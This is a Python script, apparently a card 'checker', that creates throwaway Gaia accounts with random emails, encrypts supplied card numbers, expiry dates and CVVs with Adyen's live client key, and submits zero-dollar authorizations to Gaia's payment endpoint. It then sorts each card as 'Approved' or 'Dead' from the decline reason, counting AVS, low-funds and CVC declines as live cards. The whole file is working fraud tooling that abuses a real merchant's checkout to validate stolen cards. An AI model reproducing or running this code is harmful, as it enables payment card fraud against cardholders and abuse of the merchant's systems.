from utilsdf.functions import (
    capture,
    random_email,
    random_word,
    adyen_encrypt,
)
from httpx import AsyncClient


async def rohee(cc, month, year, cvv):
    async with AsyncClient(
        follow_redirects=True, verify=False,
    ) as session:
        mail = random_email()
        n = random_word(8)

        r = await session.get(
            "https://gaia.com",
        )

        p2 = {"email": f"{mail}"}

        r2 = await session.post(
            "https://brooklyn.gaia.com/v1/checkout/account-check",
            json=p2,
        )
        t2 = r2.text
        xf = capture(t2, '"xff":"', '"')

        p3 = {
            "email": f"{mail}",
            "password": f"*{n}*",
            "firstName": f"{n}",
            "lastName": f"{n}",
            "creationSource": "zuora",
            "language": ["en"],
            "emailOptIn": False,
            "tracking": {},
        }

        r3 = await session.post(
            "https://brooklyn.gaia.com/v1/user/create",
            json=p3,
        )
        t3 = r3.text
        uuid = capture(t3, '"uuid":"', '"')
        jwt = capture(t3, '"jwt":"', '"')

        h4 = {"authorization": f"Bearer {jwt}"}

        p4 = {"experiments": []}

        r4 = await session.post(
            "https://checkoutshopper-live.adyen.com/checkoutshopper/v2/analytics/id?clientKey=live_IAMQ3KQ53JGVLO6TLYTBJGVLHUOHBG6W",
            json=p4,
        )
        t4 = r4.text
        id_ = capture(t4, '"id":"', '"')

        p5 = {
            "shopperReference": f"{uuid}",
            "velocityCheckUuid": "dc23d5ea-3fbe-410d-87e2-9892540779fb",
            "platform": "Gaia",
            "pageName": "checkout",
        }

        r5 = await session.post(
            "https://brooklyn.gaia.com/v1/user/billing/adyen/authorization",
            headers=h4,
            json=p5,
        )
        t5 = r5.text
        mer = capture(t5, '"merchantReference":"', '"')

        cc_, month_, year_, cvv_ = await adyen_encrypt(
            "v2",
            cc,
            month,
            year,
            cvv,
            "10001|E6A713D65B7B23B0A6A0EE6A8B1F7EB8B731DE2B9970097131BBA24283A0548DB3BADEC3FF85ABADF685B8528C2B7B6CC88DE4C9AFC2033618CDF5ACBE7814065CC92A78F49A0B157B86A5D06E29758B0698E852EA116E1BB8D390C202B760C4568AB4E6F25CA9AF7A169CA2AD3C4447B1AD0569BFE43F6881322A7EDC4E9C074856FB55082CD80CF11568EAD0D05B8260AF50392EA42E903C7355A197667232921A698A2D2B56CD00468727F7A59AE77BDB01596FE117AFF99B8889A94EC9F72773F93CB17BF02B7618D3B52AE5C96B7885AD928BAB79BCBEB87D4E961540E15067A3D306DEBA40F0CC05E5084A9BDB3CA665C7B8262CA0E46481A799183855",
        )

        if cc.startswith("3"):
            type_ = "amex"
        elif cc.startswith("4"):
            type_ = "visa"
        elif cc.startswith("5"):
            type_ = "mastercard"
        elif cc.startswith("6"):
            type_ = "discover"

        p6 = {
            "merchantAccount": "GaiaIncECOM",
            "amount": {"currency": "USD", "value": 0},
            "paymentMethod": {
                "type": "scheme",
                "holderName": "",
                "encryptedCardNumber": f"{cc_}",
                "encryptedExpiryMonth": f"{month_}",
                "encryptedExpiryYear": f"{year_}",
                "encryptedSecurityCode": f"{cvv_}",
                "brand": f"{type_}",
                "checkoutAttemptId": f"{id_}",
            },
            "returnUrl": "https://www.gaia.com/",
            "reference": f"{mer}",
            "shopperReference": f"{uuid}",
            "shopperEmail": f"{mail}",
            "shopperIP": f"{xf}",
            "storePaymentMethod": True,
            "metadata": {"platform": "Gaia"},
        }

        r6 = await session.post(
            "https://brooklyn.gaia.com/v1/adyen/payments",
            headers=h4,
            json=p6,
        )
        t6 = r6.text
        rc = capture(t6, '"refusalReasonCode":"', '"')
        rr = capture(t6, '"refusalReason":"', '"')
        rcc = capture(t6, '"resultCode":"', '"')
        msg = f"{rr} ({rc})"

        if rcc == "Authorised":
            status = "Approved! ✅"
            msg = "Approved"
        elif rr == "AVS Declined":
            status = "Approved! ✅ -» avs"
        elif rr == "Not enough balance":
            status = "Approved! ✅ -» low funds"
        elif rr == "CVC Declined":
            status = "Approved! ✅ -» ccn"
        else:
            status = "Dead! ❌"

        return status, msg
